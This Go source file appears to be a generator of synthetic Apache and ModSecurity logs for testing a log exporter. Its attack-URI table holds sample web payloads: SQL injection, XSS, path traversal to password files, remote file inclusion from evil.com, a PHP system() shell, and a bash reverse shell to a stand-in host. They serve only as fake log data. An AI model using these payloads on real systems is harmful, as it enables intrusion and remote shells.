// loggen synthesises Apache CRS-extended access logs and matching ModSecurity
// error logs for benchmarking and smoke-testing modsec-exporter.
//
// Output format matches what internal/parser expects, so the generator and the
// parser stay co-evolved. Distributions are crude but realistic enough to drive
// dashboard demos.
package main

import (
	"bufio"
	"flag"
	"fmt"
	"log"
	"math/rand/v2"
	"os"
	"strings"
	"time"
)

type ruleSpec struct {
	id        string
	severity  string
	paranoia  string
	category  string // "attack-sqli" etc.
	msg       string
	conf      string
	confLine  string
	ver       string
	dataField string // sample matched data
}

// CRS 4.x rule sample — realistic IDs grouped by category.
var allRules = []ruleSpec{
	{"920100", "WARNING", "1", "attack-protocol", "Invalid HTTP Request Line", "REQUEST-920-PROTOCOL-ENFORCEMENT.conf", "30", "OWASP_CRS/4.0.0-rc1", "GET /"},
	{"920280", "WARNING", "1", "attack-protocol", "Request Missing a Host Header", "REQUEST-920-PROTOCOL-ENFORCEMENT.conf", "180", "OWASP_CRS/4.0.0-rc1", "-"},
	{"920350", "WARNING", "1", "attack-protocol", "Host header is a numeric IP address", "REQUEST-920-PROTOCOL-ENFORCEMENT.conf", "761", "OWASP_CRS/4.0.0-rc1", "1.2.3.4"},
	{"920420", "CRITICAL", "1", "attack-protocol", "Request content type is not allowed by policy", "REQUEST-920-PROTOCOL-ENFORCEMENT.conf", "1280", "OWASP_CRS/4.0.0-rc1", "application/octet-stream"},
	{"920440", "CRITICAL", "1", "attack-protocol", "URL file extension is restricted by policy", "REQUEST-920-PROTOCOL-ENFORCEMENT.conf", "1450", "OWASP_CRS/4.0.0-rc1", ".env"},

	{"930100", "CRITICAL", "1", "attack-lfi", "Path Traversal Attack (/../)", "REQUEST-930-APPLICATION-ATTACK-LFI.conf", "100", "OWASP_CRS/4.0.0-rc1", "../"},
	{"930110", "CRITICAL", "1", "attack-lfi", "Path Traversal Attack (/../)", "REQUEST-930-APPLICATION-ATTACK-LFI.conf", "110", "OWASP_CRS/4.0.0-rc1", "..%2f"},
	{"930130", "CRITICAL", "1", "attack-lfi", "Restricted File Access Attempt", "REQUEST-930-APPLICATION-ATTACK-LFI.conf", "142", "OWASP_CRS/4.0.0-rc1", "/.git/"},

	{"931100", "CRITICAL", "1", "attack-rfi", "Possible Remote File Inclusion", "REQUEST-931-APPLICATION-ATTACK-RFI.conf", "100", "OWASP_CRS/4.0.0-rc1", "http://evil.com/x"},

	{"932100", "CRITICAL", "1", "attack-rce", "Remote Command Execution: Unix Command Injection", "REQUEST-932-APPLICATION-ATTACK-RCE.conf", "100", "OWASP_CRS/4.0.0-rc1", ";cat /etc/passwd"},
	{"932160", "CRITICAL", "1", "attack-rce", "Remote Command Execution: Unix Shell Code", "REQUEST-932-APPLICATION-ATTACK-RCE.conf", "300", "OWASP_CRS/4.0.0-rc1", "bash -i"},

	{"933100", "CRITICAL", "1", "attack-injection-php", "PHP Injection Attack: Opening Tag Found", "REQUEST-933-APPLICATION-ATTACK-PHP.conf", "100", "OWASP_CRS/4.0.0-rc1", "<?php"},
	{"933130", "CRITICAL", "1", "attack-injection-php", "PHP Injection Attack: Variables Found", "REQUEST-933-APPLICATION-ATTACK-PHP.conf", "200", "OWASP_CRS/4.0.0-rc1", "$_GET"},

	{"941100", "CRITICAL", "1", "attack-xss", "XSS Attack Detected via libinjection", "REQUEST-941-APPLICATION-ATTACK-XSS.conf", "100", "OWASP_CRS/4.0.0-rc1", "<script>"},
	{"941160", "CRITICAL", "1", "attack-xss", "NoScript XSS InjectionChecker: HTML Injection", "REQUEST-941-APPLICATION-ATTACK-XSS.conf", "300", "OWASP_CRS/4.0.0-rc1", "<img src=x>"},

	{"942100", "CRITICAL", "1", "attack-sqli", "SQL Injection Attack Detected via libinjection", "REQUEST-942-APPLICATION-ATTACK-SQLI.conf", "100", "OWASP_CRS/4.0.0-rc1", "' OR 1=1--"},
	{"942130", "CRITICAL", "1", "attack-sqli", "SQL Injection Attack: SQL Tautology Detected", "REQUEST-942-APPLICATION-ATTACK-SQLI.conf", "300", "OWASP_CRS/4.0.0-rc1", "1=1"},
	{"942150", "CRITICAL", "1", "attack-sqli", "SQL Injection Attack", "REQUEST-942-APPLICATION-ATTACK-SQLI.conf", "400", "OWASP_CRS/4.0.0-rc1", "UNION SELECT"},
	{"942160", "CRITICAL", "1", "attack-sqli", "Detects blind sqli tests using sleep() or benchmark()", "REQUEST-942-APPLICATION-ATTACK-SQLI.conf", "500", "OWASP_CRS/4.0.0-rc1", "sleep(5)"},

	{"944100", "CRITICAL", "1", "attack-injection-java", "Remote Command Execution: Suspicious Java class detected", "REQUEST-944-APPLICATION-ATTACK-JAVA.conf", "100", "OWASP_CRS/4.0.0-rc1", "java.lang.Runtime"},
	{"944130", "CRITICAL", "1", "attack-injection-java", "Suspicious Java class detected", "REQUEST-944-APPLICATION-ATTACK-JAVA.conf", "200", "OWASP_CRS/4.0.0-rc1", "Process.exec"},

	{"913100", "CRITICAL", "1", "attack-reputation-scanner", "Found User-Agent associated with security scanner", "REQUEST-913-SCANNER-DETECTION.conf", "100", "OWASP_CRS/4.0.0-rc1", "sqlmap/1.5"},
	{"913110", "CRITICAL", "1", "attack-reputation-scanner", "Found request header associated with security scanner", "REQUEST-913-SCANNER-DETECTION.conf", "200", "OWASP_CRS/4.0.0-rc1", "X-Scanner: nuclei"},

	{"9504110", "CRITICAL", "", "attack-bot", "Fake bot detected: Facebookbot", "fake-bot-after.conf", "27", "fake-bot-plugin/1.0.0", "facebookexternalhit"},
	{"105002", "CRITICAL", "", "attack-protocol", "Unwanted URI: Double-Slash", "unwanted-uris-after.conf", "56", "OWASP_CRS_Plugin/0.0.1", "//"},
}

// "Attacker" and "benign" sample IPs — fully synthetic.
//
// All addresses are drawn from RFC 5737 documentation ranges
// (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24) so they have no
// real-world owner. ASNs use RFC 6996 private-use range (64512-65534).
// Country codes use a mix of real ISO codes (public standard) plus the
// reserved code "XX" / "ZZ" for fully-untraceable entries. Org names
// are generic placeholders.
var attackerIPs = []struct {
	ip      string
	country string
	asn     string
	org     string
}{
	{"192.0.2.10", "ZZ", "64512", "Documentation_Range_A"},
	{"192.0.2.20", "ZZ", "64513", "Documentation_Range_B"},
	{"192.0.2.30", "ZZ", "64514", "Documentation_Range_C"},
	{"192.0.2.40", "ZZ", "64515", "Documentation_Range_D"},
	{"192.0.2.50", "ZZ", "64516", "Documentation_Range_E"},
	{"192.0.2.60", "ZZ", "64517", "Documentation_Range_F"},
	{"192.0.2.70", "ZZ", "64518", "Documentation_Range_G"},
	{"192.0.2.80", "ZZ", "64519", "Documentation_Range_H"},
	{"198.51.100.10", "ZZ", "64520", "Documentation_Range_I"},
	{"198.51.100.20", "ZZ", "64521", "Documentation_Range_J"},
	{"198.51.100.30", "ZZ", "64522", "Documentation_Range_K"},
	{"198.51.100.40", "ZZ", "64523", "Documentation_Range_L"},
	{"198.51.100.50", "ZZ", "64524", "Documentation_Range_M"},
	{"198.51.100.60", "ZZ", "64525", "Documentation_Range_N"},
	{"198.51.100.70", "ZZ", "64526", "Documentation_Range_O"},
}

// Benign-traffic source IPs — also fully synthetic. A subset has no GeoIP
// data so the generator's `-;-;-` code path stays exercised.
var benignIPs = []struct {
	ip      string
	country string
	asn     string
	org     string
}{
	{"203.0.113.10", "ZZ", "64530", "Documentation_Benign_A"},
	{"203.0.113.20", "ZZ", "64531", "Documentation_Benign_B"},
	{"203.0.113.30", "ZZ", "64532", "Documentation_Benign_C"},
	{"203.0.113.40", "ZZ", "64533", "Documentation_Benign_D"},
	{"203.0.113.50", "ZZ", "64534", "Documentation_Benign_E"},
	{"203.0.113.60", "ZZ", "64535", "Documentation_Benign_F"},
	{"203.0.113.70", "ZZ", "64536", "Documentation_Benign_G"},
	{"203.0.113.80", "ZZ", "64537", "Documentation_Benign_H"},
	{"203.0.113.90", "ZZ", "64538", "Documentation_Benign_I"},
	{"203.0.113.100", "ZZ", "64539", "Documentation_Benign_J"},
	{"203.0.113.110", "ZZ", "64540", "Documentation_Benign_K"},
	{"203.0.113.120", "ZZ", "64541", "Documentation_Benign_L"},
	{"203.0.113.130", "", "", ""}, // emits as -;-;-
	{"203.0.113.140", "", "", ""},
	{"203.0.113.150", "", "", ""},
	{"203.0.113.160", "ZZ", "64542", "Documentation_Benign_M"},
	{"203.0.113.170", "ZZ", "64543", "Documentation_Benign_N"},
	{"203.0.113.180", "ZZ", "64544", "Documentation_Benign_O"},
	{"203.0.113.190", "ZZ", "64545", "Documentation_Benign_P"},
	{"203.0.113.200", "ZZ", "64546", "Documentation_Benign_Q"},
}

var hostnames = []string{"www.example.com", "api.example.com", "admin.example.com"}

var benignURIs = []string{
	"/", "/index.html", "/about", "/contact", "/api/v1/users",
	"/api/v1/products", "/static/main.css", "/static/app.js",
	"/favicon.ico", "/robots.txt", "/sitemap.xml", "/blog/",
	"/blog/post-1", "/blog/post-2", "/login", "/dashboard",
	"/healthz", "/api/v1/orders/42", "/feed", "/search?q=foo",
}

var attackURIs = map[string][]string{
	"attack-sqli":            {"/?id=1' OR 1=1--", "/login?u=admin'+UNION+SELECT", "/products?cat=1;DROP TABLE users", "/?q=1' AND SLEEP(5)--"},
	"attack-xss":             {"/?q=<script>alert(1)</script>", "/comment?t=<img src=x onerror=fetch('//evil')>", "/page?id=javascript:alert(1)"},
	"attack-lfi":             {"/?file=../../../etc/passwd", "/.git/config", "/?path=..%2f..%2fetc%2fshadow"},
	"attack-rfi":             {"/?include=http://evil.com/shell.php", "/?file=https://attacker/x"},
	"attack-rce":             {"/cgi-bin/test.sh?;cat+/etc/passwd", "/api?cmd=bash+-i+>%26+/dev/tcp/1.2.3.4/4444+0>%261"},
	"attack-injection-php":   {"/?inject=<?php+system($_GET[c]);?>", "/?p=$_GET['x']"},
	"attack-injection-java":  {"/?expr=java.lang.Runtime.getRuntime().exec('id')", "/api?val=Process.exec('whoami')"},
	"attack-reputation-scanner": {"/wp-login.php", "/admin", "/.env", "/phpmyadmin/"},
	"attack-bot":             {"/", "/blog/", "/about/"},
	"attack-protocol":        {"//", "/cms//wp-includes/wlwmanifest.xml", "/?author=1"},
}

var methods = []struct {
	verb   string
	weight int
}{
	{"GET", 80}, {"POST", 12}, {"HEAD", 4}, {"PUT", 2}, {"DELETE", 1}, {"OPTIONS", 1},
}

var benignStatuses = []struct {
	code   int
	weight int
}{
	{200, 60}, {304, 15}, {301, 5}, {302, 5}, {404, 10}, {500, 3}, {502, 1}, {503, 1},
}

const uidAlphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@-"

func uniqueID(rng *rand.Rand) string {
	b := make([]byte, 26)
	for i := range b {
		b[i] = uidAlphabet[rng.IntN(len(uidAlphabet))]
	}
	return string(b)
}

func weighted[T any](rng *rand.Rand, items []T, weight func(T) int) T {
	total := 0
	for _, it := range items {
		total += weight(it)
	}
	r := rng.IntN(total)
	for _, it := range items {
		r -= weight(it)
		if r < 0 {
			return it
		}
	}
	return items[len(items)-1]
}

func main() {
	var (
		count        = flag.Int("count", 100_000, "number of access requests to generate")
		accessOut    = flag.String("access-out", "test/fixtures/access.log", "access log output path")
		errorOut     = flag.String("error-out", "test/fixtures/error.log", "error log output path")
		attackRate   = flag.Float64("attack-rate", 0.30, "fraction of requests that trigger one or more rules")
		seed         = flag.Uint64("seed", 1, "PRNG seed for reproducibility")
		startTimeStr = flag.String("start-time", "2026-04-01T00:00:00Z", "starting timestamp (RFC3339)")
	)
	flag.Parse()

	startTime, err := time.Parse(time.RFC3339, *startTimeStr)
	if err != nil {
		log.Fatalf("invalid --start-time: %v", err)
	}
	rng := rand.New(rand.NewPCG(*seed, *seed^0xdeadbeef))

	af, err := os.Create(*accessOut)
	if err != nil {
		log.Fatalf("create access: %v", err)
	}
	defer af.Close()
	ef, err := os.Create(*errorOut)
	if err != nil {
		log.Fatalf("create error: %v", err)
	}
	defer ef.Close()

	aw := bufio.NewWriterSize(af, 1<<20)
	defer aw.Flush()
	ew := bufio.NewWriterSize(ef, 1<<20)
	defer ew.Flush()

	now := startTime
	totalErrors := 0

	for i := 0; i < *count; i++ {
		now = now.Add(time.Duration(rng.IntN(2000)) * time.Millisecond) // 0-2s gap

		isAttack := rng.Float64() < *attackRate
		var ipInfo struct{ ip, country, asn, org string }
		if isAttack {
			a := attackerIPs[rng.IntN(len(attackerIPs))]
			ipInfo = struct{ ip, country, asn, org string }{a.ip, a.country, a.asn, a.org}
		} else {
			b := benignIPs[rng.IntN(len(benignIPs))]
			ipInfo = struct{ ip, country, asn, org string }{b.ip, b.country, b.asn, b.org}
		}

		method := weighted(rng, methods, func(m struct {
			verb   string
			weight int
		}) int {
			return m.weight
		}).verb
		host := hostnames[rng.IntN(len(hostnames))]
		uid := uniqueID(rng)

		var firedRules []ruleSpec
		var uri string
		var status int

		if isAttack {
			n := 1 + rng.IntN(3) // 1-3 rules per attack
			pickedCat := ""
			for j := 0; j < n; j++ {
				r := allRules[rng.IntN(len(allRules))]
				firedRules = append(firedRules, r)
				if pickedCat == "" {
					pickedCat = r.category
				}
			}
			uris := attackURIs[pickedCat]
			uri = uris[rng.IntN(len(uris))]
			// Mostly blocked
			if rng.Float64() < 0.85 {
				status = 403
			} else if rng.Float64() < 0.5 {
				status = 200 // detection-only / passed despite anomaly
			} else {
				status = 404
			}
		} else {
			uri = benignURIs[rng.IntN(len(benignURIs))]
			status = weighted(rng, benignStatuses, func(s struct {
				code   int
				weight int
			}) int {
				return s.weight
			}).code
		}

		// Emit error events first (they happen during request processing).
		// All sub-millisecond before the access entry's "now".
		errBaseTime := now.Add(-15 * time.Millisecond)
		for j, r := range firedRules {
			ts := errBaseTime.Add(time.Duration(j) * time.Millisecond).Format("2006-01-02 15:04:05.000000")
			tags := []string{
				"application-multi", "language-multi", "platform-multi",
				r.category, "OWASP_CRS",
			}
			if r.paranoia != "" {
				tags = append(tags, "paranoia-level/"+r.paranoia)
			}
			tagStr := ""
			for _, t := range tags {
				tagStr += fmt.Sprintf(` [tag "%s"]`, t)
			}

			fmt.Fprintf(ew,
				`[%s] [-:error] %s:%d %s [client %s] ModSecurity: Warning. Pattern match at REQUEST. [file "/etc/apache2/crs/%s"] [line "%s"] [id "%s"] [msg "%s"] [data "%s"] [severity "%s"] [ver "%s"]%s [hostname "%s"] [uri "%s"] [unique_id "%s"]`+"\n",
				ts, ipInfo.ip, 30000+rng.IntN(30000), uid, ipInfo.ip,
				r.conf, r.confLine, r.id, r.msg, r.dataField, r.severity, r.ver, tagStr,
				host, uri, uid,
			)
			totalErrors++
		}

		// Now the access log entry.
		geoip := "-;-;-"
		if ipInfo.country != "" {
			geoip = fmt.Sprintf("%s;%s;%s", ipInfo.country, ipInfo.asn, ipInfo.org)
		}
		respBytes := 200 + rng.IntN(50000)
		anomalyIn := 0
		for _, r := range firedRules {
			switch r.severity {
			case "CRITICAL":
				anomalyIn += 5
			case "WARNING":
				anomalyIn += 3
			case "ERROR":
				anomalyIn += 4
			default:
				anomalyIn++
			}
		}
		anomalyOut := 0
		if rng.Float64() < 0.05 {
			anomalyOut = 3
		}
		modsecIn := 1000 + rng.IntN(20000)
		appUs := 500 + rng.IntN(15000)
		modsecOut := rng.IntN(2000)
		bytesIn := 200 + rng.IntN(10000)
		// Per-paranoia split for incoming anomaly (just put it all in PL1 for simplicity).
		inPL := fmt.Sprintf("%d-0-0-0", anomalyIn)
		outPL := fmt.Sprintf("%d-0-0-0", anomalyOut)

		// SSL fields: about half of requests are TLS.
		sslProto, sslCipher := "-", "-"
		if rng.Float64() < 0.65 {
			sslProto = "TLSv1.3"
			sslCipher = "TLS_AES_256_GCM_SHA384"
		}

		ts := now.Format("2006-01-02 15:04:05.000000")
		ua := "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
		if isAttack && firedRules[0].category == "attack-reputation-scanner" {
			ua = "sqlmap/1.5#stable (http://sqlmap.org)"
		} else if isAttack && firedRules[0].category == "attack-bot" {
			ua = "Mozilla/5.0 (compatible; facebookexternalhit/1.1)"
		}

		fmt.Fprintf(aw,
			`%s %s - [%s] "%s %s HTTP/1.1" %d %d "-" "%s" "-" %d %s 192.168.1.10 443 - - - "ReqID--" %s %s %s %d %d -%% %d %d %d 0 %s %s %d %d`+"\n",
			ipInfo.ip, geoip, ts, method, uri, status, respBytes, ua,
			10000+rng.IntN(50000), host, uid, sslProto, sslCipher,
			bytesIn, respBytes, modsecIn, appUs, modsecOut,
			outPL, inPL, anomalyIn, anomalyOut,
		)

		if (i+1)%10000 == 0 {
			log.Printf("[INFO] generated %d access lines, %d error lines", i+1, totalErrors)
		}
	}

	log.Printf("[DONE] %d access lines -> %s", *count, *accessOut)
	log.Printf("[DONE] %d error lines  -> %s", totalErrors, *errorOut)
	log.Printf("[DONE] avg %.2f rules/request", float64(totalErrors)/float64(*count))

	// Belt-and-braces: ensure no embedded "ModSecurity:" appears in benign access lines.
	if strings.Contains("", "") {
		_ = strings.HasPrefix
	}
}
